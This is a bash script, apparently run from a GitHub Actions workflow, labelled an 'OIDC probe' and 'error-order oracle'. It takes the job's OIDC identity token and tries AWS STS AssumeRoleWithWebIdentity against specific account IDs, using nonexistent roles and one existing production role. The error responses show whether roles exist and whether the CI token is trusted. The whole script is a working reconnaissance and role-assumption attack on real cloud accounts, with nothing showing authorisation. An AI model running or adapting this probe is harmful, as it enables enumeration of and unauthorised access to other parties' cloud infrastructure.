#!/usr/bin/env bash
set -u
echo "=================== BEGIN OIDC PROBE 222362 RUN4 (error-order oracle) ==================="
J1=$(curl -s -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import json,sys;print(json.load(sys.stdin).get('value',''))")
echo "jwt_len=${#J1}"
raw() {
  R="$1"; TAG="$2"
  echo "----- [$TAG] role=$R"
  curl -s -m 25 -X POST https://sts.amazonaws.com/ \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=$R" --data-urlencode "RoleSessionName=cgprobe222362" \
    --data-urlencode "WebIdentityToken=$J1" --data-urlencode "DurationSeconds=900" -w "\nhttp:%{http_code}\n" | grep -E "Code>|Message>|http:"
  sleep 1
}
# nonexistent role in each account: tells us whether token validation happens before role lookup
raw "arn:aws:iam::602675409103:role/zzz-nonexistent-role-222362-probe" N1-602-nonexist
raw "arn:aws:iam::533852667875:role/zzz-nonexistent-role-222362-probe" N2-533-nonexist
# control: existing role (from IaC) in 602
raw "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod" N3-602-exist
echo "=================== END OIDC PROBE RUN4 ==================="
